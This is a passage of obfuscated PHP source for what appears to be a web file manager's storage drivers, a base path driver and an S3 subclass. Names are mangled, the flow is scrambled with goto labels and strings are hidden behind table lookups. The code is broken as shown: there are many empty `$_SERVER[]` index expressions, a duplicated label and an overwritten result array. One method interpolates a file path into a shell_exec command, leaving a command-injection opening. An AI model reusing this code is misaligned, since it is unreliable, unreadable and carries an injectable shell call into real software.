$bį->eventRecycle($Aȏέ, $c[2014]); } } } goto B; C: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $e =& $_SERVER[]; $this->objectDriver = array($e[57], $e[58], $e[59], $e[60], $e[61], $e[62], $e[63], $e[64], $e[65]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($dސƨ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($dސƨ, $_SERVER[][8]); } return $dސƨ; } public function iconvApp($FݴɃ) { return $FݴɃ; } public function iconvSystem($a蘰) { return $a蘰; } public function iconvTo($f, $cҷ, $C) { goto Aߛ; b뫬: $c = $cҷ . $bԹ[67] . $C . $bԹ[68] . $f; if (isset($C[$c])) { return $C[$c]; } if (function_exists($bԹ[69])) { $C潝 = @mb_convert_encoding($f, $C, $cҷ); } else { $C潝 = @iconv($cҷ, $C, $f); } goto c; c: $C潝 = $C潝 ? $C潝 : $f; if (strstr($C潝, $bԹ[70])) { $C潝 = str_replace($bԹ[70], $bԹ[71], $C潝); } $C[$cҷ . $bԹ[67] . $C . $bԹ[68] . $f] = $C潝; goto Dґ; Dꎏ: return $C潝; goto f; Dґ: $C[$C . $bԹ[67] . $cҷ . $bԹ[68] . $f] = $f; $C[$C . $bԹ[67] . $cҷ . $bԹ[68] . $C潝] = $f; $C[$cҷ . $bԹ[67] . $C . $bԹ[68] . $C潝] = $C潝; goto Dꎏ; Aߛ: $bԹ =& $_SERVER[]; if (!$f || !function_exists($bԹ[66])) { return $f; } static $C = array(); goto b뫬; f: } public function getPathInner($Cȉ) { $fᆉ = IO::init($Cȉ); return $fᆉ->path; } public function getPathOuter($cȴ򋲡) { $BĐ =& $_SERVER[]; $CҐ = strlen(trim($this->pathBase, $BĐ[8])); $cȴ򋲡 = substr(trim($cȴ򋲡, $BĐ[8]), $CҐ); return $this->pathDriver . $BĐ[8] . ltrim($cȴ򋲡, $BĐ[8]); } public function isParentOf($a퇋, $A) { $cȣ =& $_SERVER[]; $a퇋 = rtrim(strtolower($a퇋), $cȣ[8]) . $cȣ[8]; $A = rtrim(strtolower($A), $cȣ[8]) . $cȣ[8]; $dďВ = strpos($A, $a퇋) === 0; return $dďВ; } public function getType() { $b =& $_SERVER[]; $e = str_replace($b[72], $b[33], get_class($this)); return strtolower($e); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($F͒, $eة) { $a =& $_SERVER[]; $bΑ = rtrim($F͒, $a[8]) . $a[8] . $eة; $C̪ = $this->exist($bΑ); return $C̪ ? $bΑ : !1; } public function setModifyTime($Eз߂, $fĞ× = '') { } public function renameObject($c, $fꉊ) { goto b΢; d֘訤: $c = $this->getPathOuter($c); $fꉊ = $this->pathFather($c) . $fꉊ; if (IO::isFile($c)) { $e = IO::copy($c, $this->pathFather($c), REPEAT_RENAME_FOLDER, $b֝㗣ϑ); if ($e) { IO::remove($c); } } else { $e = IO::mkdir($fꉊ); if (!$e) { return !1; } $d˶ = IO::listPath($c, !0); $a̋ö = array_merge($d˶[$b[74]], $d˶[$b[75]]); foreach ($a̋ö as $f) { IO::move($f[$b[76]], $fꉊ, REPEAT_RENAME_FOLDER); } IO::remove($c); } goto e煛; e煛: return $e ? $fꉊ : !1; goto c扄; b΢: $b =& $_SERVER[]; $b֝㗣ϑ = $fꉊ; Hook::trigger($b[73], $this, $c, $this, $this->pathFather($c) . $fꉊ); goto d֘訤; c扄: } public function tempFile($Cٓ = '', $f = '') { goto D; D: if (!$Cٓ) { $Cٓ = rand_string(15); } $c = TEMP_FILES . rand_string(15) . $_SERVER[][8]; @mkdir($c, DEFAULT_PERRMISSIONS, !0); goto E; E: $E = $c . $Cٓ; @touch($E); if ($f) { file_put_contents($E, $f); } goto cޥ; cޥ: return $E; goto E; E: } public function tempFileRemve($e) { @unlink($e); @rmdir($this->pathFather($e)); } public function mkfile($dϒ, $d = '', $aӦϒ = REPEAT_RENAME) { } public function mkdir($e̋, $B߰ = REPEAT_SKIP) { } public function delFile($cӹ) { } public function delFolder($B޼ڿ) { } public function copyFile($d, $F) { } public function moveFile($b, $e) { } public function remove($aܣ򎬽) { if ($this->isFile($aܣ򎬽)) { return $this->delFile($aܣ򎬽); } return $this->delFolder($aܣ򎬽); } public function rename($Aё, $fհޫ) { } public function exist($bղ𜝹) { } public function findByHash($Dڞ = '', $C = '') { return !1; } public function isFile($dЅڻ) { } public function isFolder($B) { } public function size($c) { } public function info($D) { } public function infoSimple($a) { return $this->info($a); } public function infoAuth($Aѓ) { return $this->info($Aѓ); } public function infoFull($E־) { return $this->info($E־); } public function infoWithChildren($cǴŴ) { $E =& $_SERVER[]; static $dᕣ߆ = array(); if (isset($dᕣ߆[$cǴŴ])) { return $dᕣ߆[$cǴŴ]; } $f = $this->info($cǴŴ); if ($f && $f[$E[29]] == $E[77]) { $A熮 = array($E[78] => 0, $E[79] => 0, $E[80] => 0); $this->infoChildren($cǴŴ, $A熮); $f[$E[78]] = $A熮[$E[78]]; $f[$E[81]] = array($E[82] => $A熮[$E[79]], $E[83] => $A熮[$E[80]]); $dᕣ߆[$cǴŴ] = $f; } return $f; } public function listPath($bꡋ, $a乳 = false) { } public function has($Bƶ, $aݨ = false, $Dц = false) { } public function canRead($Bְ) { } public function canWrite($Bᾰ) { } public function getContent($c) { } public function setContent($Eܘ͖, $e = '') { } protected function infoChildren($a, &$e쉾) { $fۅ =& $_SERVER[]; check_abort_echo(); $bՅ = $this->listPath($a, !0); $bՅ = array_merge($bՅ[$fۅ[75]], $bՅ[$fۅ[74]]); foreach ($bՅ as $C֧) { if ($C֧[$fۅ[29]] == $fۅ[77]) { $e쉾[$fۅ[80]]++; $Bܣ꣭ = $this->getPathInner($C֧[$fۅ[76]]); $this->infoChildren($Bܣ꣭, $e쉾); } else { $e쉾[$fۅ[79]]++; $e쉾[$fۅ[78]] += $C֧[$fۅ[78]]; } } } public function fileSubstr($Cւ, $b, $D磥) { } public function listAll($F푨) { } public function listAllMake($E߹, &$AϺŝ) { $dʂ =& $_SERVER[]; check_abort_echo(); $a = $this->listPath($E߹, !0); if (!$a) { return; } $aōӱ = array_merge($a[$dʂ[75]], $a[$dʂ[74]]); foreach ($aōӱ as $d䨋) { goto b; EŬň: $this->listAllMake($d䨋[$dʂ[76]], $AϺŝ); goto dΕ; b: $B = $d䨋[$dʂ[29]] == $dʂ[77]; $Bݛ = array($dʂ[76] => $d䨋[$dʂ[76]], $dʂ[77] => $B); if (isset($d䨋[$dʂ[78]])) { $Bݛ[$dʂ[78]] = $d䨋[$dʂ[78]]; } goto CË; CË: if (isset($d䨋[$dʂ[84]])) { $Bݛ[$dʂ[84]] = $d䨋[$dʂ[84]]; } if (!$B) { $AϺŝ[] = $Bݛ; continue; } $AϺŝ[] = $Bݛ; goto EŬň; dΕ: } } public function listAllSimple($E) { $a =& $_SERVER[]; $bЕև֩ = array(); $aը߈ = $this->listAll($E); $dşꪬ = $this->getPathOuter($E); foreach ($aը߈ as $dӨ༹) { goto d; BǾ: if (!$dӨ༹[$a[77]]) { $f[$a[86]] = $E؆鴕; } $bЕև֩[] = $f; goto eɇ; d: $E؆鴕 = $dӨ༹[$a[76]]; $f = $dӨ༹[$a[76]]; if (isset($dӨ༹[$a[85]])) { $E؆鴕 = $dӨ༹[$a[85]][$a[76]]; $dӨ༹[$a[78]] = $dӨ༹[$a[85]][$a[78]]; $dӨ༹[$a[84]] = $dӨ༹[$a[85]][$a[84]]; } else { $f = substr($dӨ༹[$a[76]], strlen(get_path_father($dşꪬ))); $f = $a[8] . ltrim($f, $a[8]); } goto B圚; B圚: $f = array($a[76] => $f, $a[77] => $dӨ༹[$a[77]]); if (isset($dӨ༹[$a[78]]) && !$dӨ༹[$a[77]]) { $f[$a[78]] = $dӨ༹[$a[78]]; } if (isset($dӨ༹[$a[84]])) { $f[$a[84]] = $dӨ༹[$a[84]]; } goto BǾ; eɇ: } return $bЕև֩; } public function upload($aᙠ韶, $c򚄻, $d = false, $dĖ = REPEAT_REPLACE) { } public function uploadFileByID($Eϑ膡, $cµ, $Fҳɞ) { } public function uploadFileByPath($D, $dޖڙ, $e𐦜 = array()) { } public function isUploadServer() { $EۆС =& $_SERVER[]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $EۆС[87]) { return !0; } return $GLOBALS[$EۆС[6]][$EۆС[88]][$EۆС[89]]; } public function isFileOutServer() { $Eϳڟ =& $_SERVER[]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $Eϳڟ[87]) { return !0; } return $GLOBALS[$Eϳڟ[6]][$Eϳڟ[88]][$Eϳڟ[90]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($F) { $d =& $_SERVER[]; if (!$this->isCdnHost()) { return $F; } return str_replace(trim(get_url_root($F), $d[8]), trim($this->cdnHost, $d[8]), $F); } public function uploadLink($e, $C烈 = 0) { goto b; b: $eԪ =& $_SERVER[]; if ($this->isUploadServer()) { return; } $F = $this->getType(); goto a𤑸; a𤑸: if (!in_array($F, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $A⫱ = 1024 * 1024 * 10; goto bץ; Aʶ߲: if ($CŤ) { $CŤ[$eԪ[93]] = $e; $CŤ[$eԪ[94]] = $F; } return $CŤ; goto a; bץ: $dӿ = $C烈 <= $A⫱ ? $eԪ[91] : $eԪ[92]; $C = (!$C烈 ? 1 : ceil($C烈 / pow(1024, 3))) * 3600 * 4; $CŤ = $this->{$dӿ}($e, $C); goto Aʶ߲; a: } public function uploadFormData($e߄, $c賶 = 3600) { } public function multiUploadFormData($bˊ, $f׬ܐ = 3600) { } public function download($aؠ, $d) { } public function ext($bǃ) { $c =& $_SERVER[]; if (strpos($bǃ, $c[8]) === -1) { $fն = $bǃ; } else { $fն = $this->pathThis($bǃ); } $C΅ = $c[33]; if (strstr($fն, $c[95])) { $C΅ = substr($fն, strrpos($fն, $c[95]) + 1); $C΅ = strtolower($C΅); } if (strlen($C΅) > 3 && preg_match($c[96], $C΅, $C)) { $C΅ = $c[33]; } return $C΅; } public function pathThis($d泐) { $C =& $_SERVER[]; $d泐 = str_replace($C[97], $C[8], rtrim($d泐, $C[8])); $E¶ = strrpos($d泐, $C[8]); if ($E¶ === !1) { return $d泐; } return substr($d泐, $E¶ + 1); } public function pathFather($A) { $DҠ =& $_SERVER[]; $A = str_replace($DҠ[97], $DҠ[8], rtrim($A, $DҠ[8])); $aϷ = strrpos($A, $DҠ[8]); if ($aϷ === !1) { return $DҠ[33]; } return substr($A, 0, $aϷ + 1); } public function hashSimple($C) { goto dד; b֐: $bЍ˨ .= $this->fileSubstr($C, $eƨ - $AƢ, $AƢ); return md5($bЍ˨) . $eƨ; goto D; dד: $DՅ =& $_SERVER[]; if (!$C) { return md5($DՅ[33]); } $eƨ = $this->size($C); goto Dￌ; f］: $Eٍ = intval($eƨ / $Dӱ); $bЍ˨ = $DՅ[33]; for ($a = 0; $a < $Dӱ; $a++) { $bЍ˨ .= $this->fileSubstr($C, $Eٍ * $a, $AƢ); } goto b֐; Dￌ: $AƢ = 200; $Dӱ = 50; if ($eƨ <= $AƢ * $Dӱ) { return $this->hashMd5($C) . $eƨ; } goto f］; D: } public static $md5Cache = array(); public function hashMd5($CĈّ) { $CĈّ = $this->iconvSystem($CĈّ); if (isset(self::$md5Cache[$CĈّ])) { return self::$md5Cache[$CĈّ]; } self::$md5Cache[$CĈّ] = $this->hashMd5Shell($CĈّ); if (!self::$md5Cache[$CĈّ]) { self::$md5Cache[$CĈّ] = @md5_file($CĈّ); } return self::$md5Cache[$CĈّ]; } private function hashMd5Shell($a܈) { goto aĠ; f僯: $C綢 = shell_exec($c . "\40\42{$a܈}\x22"); $C綢 = str_replace($Dݲ[104], $Dݲ[33], $C綢); return substr($C綢, 0, 32); goto eȚʣ; aĠ: $Dݲ =& $_SERVER[]; if (!function_exists($Dݲ[98])) { return !1; } $CԘ٭ = array($Dݲ[99], $Dݲ[100]); goto a; a: $c = Cache::get($Dݲ[101]); if (!$c) { $a߆ = BASIC_PATH . $Dݲ[102]; $F֧ = md5_file($a߆); $c = $Dݲ[103]; foreach ($CԘ٭ as $A) { $C綢 = shell_exec($A . "\x20\42{$a߆}\x22"); if ($C綢 && substr(trim($C綢), 0, 32) == $F֧) { $c = $A; break; } } Cache::set($Dݲ[101], $c, 3600); } if ($c == $Dݲ[103]) { return !1; } goto f僯; eȚʣ: } public function link($f񅯑) { return $f񅯑; } public function fileOut($Dݖ, $C庣砻 = false, $Aڏ㘷΢ = false, $cȵ = '') { goto AЄ; AЄ: $BᨲɅ =& $_SERVER[]; $this->cacheMethod(null, null); if (!$Dݖ || !$this->exist($Dݖ)) { show_json(LNG($BᨲɅ[105]), !1, $Aڏ㘷΢); } goto Dΰ; d: $AƗЕ = !0; if ($_SERVER[$BᨲɅ[154]] == $BᨲɅ[155] && $eʸ > 1204 * 1024 * 1024 * 2) { $AƗЕ = !1; } if ($AƗЕ) { header($BᨲɅ[156] . ($A - $f + 1)); } goto a; Dΰ: $f߂ = $this->getType() == $BᨲɅ[106]; $c妗 = $GLOBALS[$BᨲɅ[6]][$BᨲɅ[88]][$BᨲɅ[107]][$BᨲɅ[108]]; $fۈ = (double) $GLOBALS[$BᨲɅ[6]][$BᨲɅ[88]][$BᨲɅ[107]][$BᨲɅ[109]] * 1024 * 1024; goto f؃㉹; d֯: header($BᨲɅ[120]); header($BᨲɅ[121] . $c׋); $F랎 = rawurlencode($f䑏); goto A؅; C󯯍: $cɋ = strtolower($_SERVER[$BᨲɅ[142]]); if ($f߂ && $cɋ && $c妗) { if (strstr($cɋ, $BᨲɅ[143])) { header($BᨲɅ[144] . $Dݖ); } else { if (strstr($cɋ, $BᨲɅ[145])) { header($BᨲɅ[146] . $Dݖ); } else { if (strstr($cɋ, $BᨲɅ[147])) { header($BᨲɅ[148] . $Dݖ); } } } if ($fۈ) { header($BᨲɅ[149] . $fۈ); } return; } if (isset($_SERVER[$BᨲɅ[150]])) { if (preg_match($BᨲɅ[151], $_SERVER[$BᨲɅ[150]], $a竩)) { $f = intval($a竩[1]); if (!empty($a竩[2])) { $A = intval($a竩[2]); } } header($BᨲɅ[152]); header("\103\x6f\x6e\x74\145\x6e\164\x2d\x52\x61\x6e\147\x65\x3a\40\142\x79\x74\145\163\40{$f}\55{$A}\x2f" . $eʸ); } else { header($BᨲɅ[153]); } goto d; a: if ($_SERVER[$BᨲɅ[157]] == $BᨲɅ[158]) { return; } $BҠ = 1024 * 100; $DȤӇЈ = 0; goto B; Fظ: $eʸ = $Bϸҭ[$BᨲɅ[78]]; $cÌ = gmdate($BᨲɅ[110], $Bϸҭ[$BᨲɅ[84]]); $f䑏 = $Aڏ㘷΢ ? $Aڏ㘷΢ : $this->iconvApp($Bϸҭ[$BᨲɅ[28]]); goto Dڄ; f: header($BᨲɅ[135] . $cÌ . $BᨲɅ[127]); header($BᨲɅ[136] . $f䑏); header($BᨲɅ[137]); goto bŅᙒ; f؃㉹: @ob_end_clean(); set_timeout(); $Bϸҭ = $this->infoFull($Dݖ); goto Fظ; C: if (isset($_SERVER[$BᨲɅ[131]]) && strtotime($_SERVER[$BᨲɅ[131]]) == $Bϸҭ[$BᨲɅ[84]]) { header($BᨲɅ[132], !0, 304); die; } if (isset($_SERVER[$BᨲɅ[133]]) && $_SERVER[$BᨲɅ[133]] == $cȵ) { header($BᨲɅ[134] . $cȵ, !0, 304); die; } header($BᨲɅ[134] . $cȵ); goto f; A: header($BᨲɅ[128]); header($BᨲɅ[129]); header($BᨲɅ[130]); goto C; B: if ($fۈ) { $DȤӇЈ = intval(1000 * 1000 * ($BҠ / $fۈ)); } while ($f <= $A) { $d̺ = timeFloat(); check_abort(); $a嶫 = $A - $f + 1; if ($a嶫 <= $BҠ) { $BҠ = $a嶫; } echo $this->fileSubstr($Dݖ, $f, $BҠ); $f += $BҠ; if ($BҠ == $a嶫) { $f = $A + 1; } if ($DȤӇЈ) { $Eҡ = intval(1000 * 1000 * (timeFloat() - $d̺)); $Aڌ = $DȤӇЈ - $Eҡ; if ($Aڌ > 5) { usleep($Aڌ); } } } goto a; Dڄ: $f = 0; $A = $eʸ - 1; $bɡ = $this->ext($f䑏); goto fñ; B: $c׋ = get_file_mime($bɡ); if (strstr($c׋, $BᨲɅ[117])) { $c׋ = $c׋ . $BᨲɅ[118]; } if ($C庣砻 === !1 && !mime_support($c׋)) { $C庣砻 = !0; $c׋ = $BᨲɅ[119]; } goto d֯; bŅᙒ: header($BᨲɅ[138] . $eʸ); header($BᨲɅ[139]); if (!$C庣砻 && $bɡ == $BᨲɅ[140]) { if ($eʸ > 1024 * 1024 * 5) { die; } $B͑ = $this->getContent($Dݖ); $B͑ = Html::clearSVG($B͑); header($BᨲɅ[141] . strlen($B͑)); echo $B͑; die; } goto C󯯍; fñ: if (in_array($bɡ, array($BᨲɅ[111], $BᨲɅ[112], $BᨲɅ[113], $BᨲɅ[114]))) { $bɡ = $BᨲɅ[115]; } if (!$cȵ) { $cȵ = md5($cÌ . $this->hashSimple($Dݖ)); } $cȵ = $BᨲɅ[116] . $cȵ . $BᨲɅ[116]; goto B; A؅: $F랎 = $BᨲɅ[116] . $F랎 . $BᨲɅ[122] . $F랎; if ($C庣砻) { header($BᨲɅ[123]); header($BᨲɅ[124] . $F랎); } else { header($BᨲɅ[125] . $F랎); } header($BᨲɅ[126] . gmdate($BᨲɅ[110], time() + 3600 * 24 * 30) . $BᨲɅ[127]); goto A; a: } public function fileOutServer($dڱۙ, $DѲ = false, $a = false, $Dȏﬃ = '') { $this->fileOut($dڱۙ, $DѲ, $a, $Dȏﬃ); } public function fileOutLink($cӳ) { header($_SERVER[][159] . $cӳ); die; } public function cacheMethod($f, $D, $a = null) { goto FǼ; Eꡳ: if (!is_null($a)) { $aՖ[$D׬о] = $a; return; } $Fߓ = isset($aՖ[$D׬о]) ? $aՖ[$D׬о] : null; if (!is_null($Fߓ)) { return $Fߓ; } goto aŐ汌; FǼ: $dދ߬ =& $_SERVER[]; static $aՖ = array(); $Fϻ = $D ? ltrim($this->getPathOuter($D), $dދ߬[8]) : $D; goto D܊; aŐ汌: $Fߓ = $this->{$f}($D); $aՖ[$D׬о] = $Fߓ; return $Fߓ; goto e; D܊: $D׬о = $dދ߬[160] . $f . $dދ߬[161] . rtrim($Fϻ, $dދ߬[8]); if (is_null($f)) { $aՖ = array(); return; } if (is_null($D)) { unset($aՖ[$D׬о]); return; } goto Eꡳ; e: } public function fileOutImage($eܚؓ, $d = 250) { goto F; c߃: del_file($DȊ); IO::fileOut($Bď); goto c; A̷͌: if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $DȊ = DATA_THUMB . $d; del_file($DȊ); goto DĤʞ; DĤʞ: if (!@file_exists($DȊ)) { $C = TEMP_FILES; if (!is_dir($C)) { mk_dir($C); } $A = $C . $bЭ . $E[95] . $Dޡ[$E[168]]; if (!@file_exists($A)) { $A = $this->download($eܚؓ, $A); } ImageThumb::createThumb($A, $DȊ, $d, $d * 10); } if (!file_exists($DȊ) || filesize($DȊ) < 100) { return @file_exists($A) ? IO::fileOut($A) : $this->fileOut($eܚؓ); } if (!($Bď = IO::move($DȊ, $Cӊ׭))) { return IO::fileOut($DȊ); } goto c߃; d: $d = "{$bЭ}\137{$d}\x2e\160\156\x67"; if (!($C = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $E[172]))) { $Cӊ׭ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $E[173]); } else { $Cӊ׭ = KodIO::make($C); } if ($C = IO::fileNameExist($Cӊ׭, $d)) { $DȊ = KodIO::make($C); return IO::fileOut($DȊ, !1, $eɭ); } goto A̷͌; B: if (isset($GLOBALS[$E[162]]) && $GLOBALS[$E[162]][$E[76]] == $Dޡ[$E[76]]) { $d؄؞ = $GLOBALS[$E[162]][$E[163]]; if (!$Dޡ[$E[164]]) { $Dޡ[$E[164]] = $GLOBALS[$E[162]]; } if (isset($d؄؞[$E[165]])) { if ($d؄؞[$E[165]] <= $d && $d؄؞[$E[166]] <= $d) { $bӝ = !0; } } $eɭ = $Dޡ[$E[164]][$E[28]]; } if ($Dޡ[$E[78]] <= 1024 * 50 || $bӝ || !function_exists($E[167]) || $Dޡ[$E[168]] == $E[169]) { return $this->fileOut($eܚؓ, !1, $eɭ); } if (isset($Dޡ[$E[164]][$E[170]])) { $bЭ = $Dޡ[$E[164]][$E[170]]; } else { if (isset($Dޡ[$E[164]][$E[171]])) { $bЭ = $Dޡ[$E[164]][$E[171]]; } else { $bЭ = md5("{$Dޡ[$E[28]]}\x5f{$Dޡ[$E[76]]}\137{$Dޡ[$E[78]]}"); } } goto d; F: $E =& $_SERVER[]; set_timeout(); if (substr($eܚؓ, 0, 4) == $E[147]) { $this->fileOutLink($eܚؓ); } goto e믧; e믧: $Dޡ = $this->info($eܚؓ); $eɭ = $Dޡ[$E[28]]; $bӝ = !1; goto B; c: } public function fileOutImageServer($a띿ؕ, $Bγ = 250) { $this->fileOutImage($a띿ؕ, $Bγ); } public function fileNameAuto($C݅, $AƎ, $dܟ = REPEAT_RENAME, $CҖ = false) { goto d֗; b: $D = 1; $C򇓩 = substr($AƎ, 0, strlen($AƎ) - strlen($b땊)); $bȍԉ = $C򇓩 . "\x28{$D}\51{$b땊}"; goto e噥; F: if ($dܟ == REPEAT_SKIP) { return !1; } $b땊 = $dǑ[95] . get_path_ext($AƎ); $b땊 = $b땊 == $dǑ[95] || $CҖ ? $dǑ[33] : $b땊; goto b; d֗: $dǑ =& $_SERVER[]; $e = $C݅ === $dǑ[33] ? $AƎ : rtrim($C݅, $dǑ[8]) . $dǑ[8] . $AƎ; if ($dܟ == REPEAT_REPLACE || !$this->exist($e) || $CҖ && $dܟ != REPEAT_RENAME_FOLDER) { return $AƎ; } goto F; e噥: while ($this->exist(rtrim($C݅, $dǑ[8]) . $dǑ[8] . $bȍԉ)) { $bȍԉ = $C򇓩 . "\x28{$D}\x29{$b땊}"; $D++; } return $bȍԉ; goto fɃ; fɃ: } private function fileNameAutoList($BŃ, $FÑ, $a狈 = false) { goto Dˎ; dτ懯: $cл = array_to_keyvalue($D֬ɘ, $dÏ[33], $dÏ[28]); $d㒌 = $dÏ[95] . get_path_ext($FÑ); $d㒌 = $d㒌 == $dÏ[95] || $a狈 ? $dÏ[33] : $d㒌; goto CӑԞ; CӑԞ: $fھА = substr($FÑ, 0, strlen($FÑ) - strlen($d㒌)); $BϏ = $fھА . "\50\60\51{$d㒌}"; for ($A㌎ = 1; $A㌎ <= count($cл) + 1; $A㌎++) { $BϏ = $fھА . "\50{$A㌎}\51{$d㒌}"; if (!in_array_not_case($BϏ, $cл)) { return $BϏ; } } goto C; Dˎ: $dÏ =& $_SERVER[]; $D֬ɘ = $this->listPath($BŃ, !0); $D֬ɘ = array_merge($D֬ɘ[$dÏ[75]], $D֬ɘ[$dÏ[74]]); goto dτ懯; C: return $BϏ; goto dě; dě: } public function listAllFiles($BȎ۪, $bԥ, $bɎＯ = array()) { goto Eח; C: $BȎ۪ = trim($BȎ۪, $D[8]); foreach ($bԥ as $Aɉ) { $a奈􌗏 = ltrim(substr(trim($Aɉ, $D[8]), strlen($BȎ۪)), $D[8]); $fٮ = array_merge($fٮ, $this->slicePath($a奈􌗏)); } $C = array(); goto Eʟͽ; Eʟͽ: foreach (array_unique($fٮ) as $Aɉ) { $C = array($D[76] => $this->getPathOuter($D[8] . $BȎ۪ . $D[8] . $Aɉ), $D[77] => 1, $D[78] => 0); if (substr($Aɉ, -1) != $D[8]) { $C[$D[77]] = 0; $E = $this->getPath($BȎ۪ . $D[8] . $Aɉ); $C[$D[78]] = isset($bɎＯ[$E]) ? $bɎＯ[$E] : $this->size($E); } $C[] = $C; } return $C; goto Eغ; Eח: $D =& $_SERVER[]; if (empty($bԥ)) { return array(); } $fٮ = array(); goto C; Eغ: } public function slicePath($EȐ) { $F̢ =& $_SERVER[]; $d̉ԛ = explode($F̢[8], trim($EȐ, $F̢[8])); $D = 0; do { ++$D; $a[] = implode($F̢[8], array_slice($d̉ԛ, 0, $D)) . $F̢[8]; } while ($D < count($d̉ԛ)); $a[count($d̉ԛ) - 1] = $EȐ; return $a; } public function getHost() { $c풨 =& $_SERVER[]; $d錃 = parse_url(trim($this->domain, $c풨[8])); $C˗ﻑ = isset($d錃[$c풨[174]]) ? $d錃[$c풨[174]] : http_type(); $Aʍҏ = isset($d錃[$c풨[175]]) ? $d錃[$c풨[175]] : $d錃[$c풨[76]]; if (isset($d錃[$c풨[176]])) { $Aʍҏ .= $c풨[4] . $d錃[$c풨[176]]; } return $C˗ﻑ . $c풨[177] . $Aʍҏ; } public function pathEncode($BƮ) { $bꌯ =& $_SERVER[]; return str_replace($bꌯ[178], $bꌯ[8], rawurlencode($BƮ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($C) { set_timeout(); require_once SDK_DIR . $_SERVER[][179]; parent::__construct(); $this->_init($C); } public function _init($C܎) { foreach ($C܎ as $C鎙 => $bڃ) { if (isset($this->{$C鎙})) { $this->{$C鎙} = $bڃ; } } $this->endpoint = $C܎[$_SERVER[][180]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($dб⹛š = "\x76\x34") { $this->signVer = $dб⹛š; $this->client->setSignatureVersion($dб⹛š); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto Dǲ; Dǲ: $F =& $_SERVER[]; $cƇ = $this->getBucketCors(); if (!$cƇ || !is_array($cƇ)) { return !1; } goto d; fҜԏ: $f͞ = array($F[186], $F[187], $F[188], $F[189], $F[190]); $e = array_diff($f͞, $EꢖҎ); return empty($e); goto b; d: if ($cƇ[$F[181]] != $F[182] || $cƇ[$F[183]] != $F[182]) { return !1; } $EꢖҎ = array_map($F[184], $cƇ[$F[185]]); if (!is_array($EꢖҎ)) { $EꢖҎ = array(); } goto fҜԏ; b: } public function mkfile($d, $CЌ = '', $Cԧ = REPEAT_RENAME) { $eͪ = $this->setContent($d, $CЌ); if ($eͪ !== !1) { return $this->getPathOuter($d); } return !1; } public function mkdir($A, $d = REPEAT_SKIP) { $Fɋ =& $_SERVER[]; if (empty($A) && $A !== $Fɋ[191]) { return !1; } if ($this->_isFolder($A)) { return $this->getPathOuter($A); } $B쐻 = $this->setContent($A, $Fɋ[33], !0); if ($B쐻 !== !1) { return $this->getPathOuter($A); } return !1; } public function copyFile($dşߟ, $D, $fͬ = array()) { $B =& $_SERVER[]; $A弥 = $this->objectMeta($dşߟ); if (!$A弥) { return !1; } if ($A弥[$B[78]] <= 1024 * 1024 * 200) { $eה = $this->client->copyObject($this->bucket, $dşߟ, $this->bucket, $D, $B[192], $fͬ); } else { $eה = $this->client->multiCopyObject($this->bucket, $dşߟ, $this->bucket, $D, $fͬ); } $eה = $eה ? $this->getPathOuter($D) : !1; return $eה; } public function moveFile($e, $dԓ) { if ($this->copyFile($e, $dԓ)) { $this->delFile($e); return $this->getPathOuter($dԓ); } return !1; } public function delFile($cʞ) { return $this->client->deleteObject($this->bucket, $cʞ); } public function delFolder($b) { goto C늒; a: if (!empty($b) && $b !== $ḅ[191] && !in_array($BĂǦ, $F[$ḅ[75]])) { $F[$ḅ[75]][] = $BĂǦ; } $d魐 = $this->delByBatch($F[$ḅ[74]]); if (!$d魐) { return !1; } goto Cк; C늒: $ḅ =& $_SERVER[]; if (!$this->exist($b)) { return !0; } $this->listItemCache = !1; goto b; Cк: $d魐 = $this->delByBatch($F[$ḅ[75]]); if (!$d魐) { return !1; } return $this->delFile($BĂǦ); goto FȨ; b: $F = $this->fileList($b); $this->listItemCache = !0; $BĂǦ = trim($b, $ḅ[8]) . $ḅ[8]; goto a; FȨ: } private function delByBatch($e뱍) { foreach (array_chunk($e뱍, 1000) as $DṆ) { $Eޗ = $this->client->deleteObjects($this->bucket, $DṆ); if (!$Eޗ) { return !1; } } return !0; } public function rename($eˏɵ, $a) { return $this->renameObject($eˏɵ, $a); } public function listPath($F乖, $C򕄈 = false) { $BΈ =& $_SERVER[]; $b؈Ç = $this->fileList($F乖, $BΈ[8], !0); foreach ($b؈Ç[$BΈ[75]] as $c => $f㤕) { $b؈Ç[$BΈ[75]][$c] = $this->folderInfo($f㤕, $C򕄈); } foreach ($b؈Ç[$BΈ[74]] as $c => $f㤕) { $b؈Ç[$BΈ[74]][$c] = $this->fileInfo($f㤕[$BΈ[28]], $C򕄈, $f㤕); } return $b؈Ç; } private function fileInfo($B, $dǹ = false, $b㪷 = array()) { goto C; C: $A᩵ =& $_SERVER[]; $A넥 = array($A᩵[28] => $this->pathThis($B), $A᩵[76] => $this->getPathOuter($B), $A᩵[29] => $A᩵[193], $A᩵[168] => $this->ext($B), $A᩵[78] => isset($b㪷[$A᩵[78]]) ? $b㪷[$A᩵[78]] : 0); if ($dǹ) { return $A넥; } goto C㬼; C㬼: $A넥[$A᩵[194]] = $A넥[$A᩵[84]] = 0; $A넥[$A᩵[195]] = $A넥[$A᩵[196]] = !0; if (empty($b㪷)) { $b㪷 = $this->objectMeta($B); if (!$b㪷) { return $A넥; } } goto C؉; C؉: if (isset($b㪷[$A᩵[197]])) { $A넥[$A᩵[84]] = $b㪷[$A᩵[197]]; } if 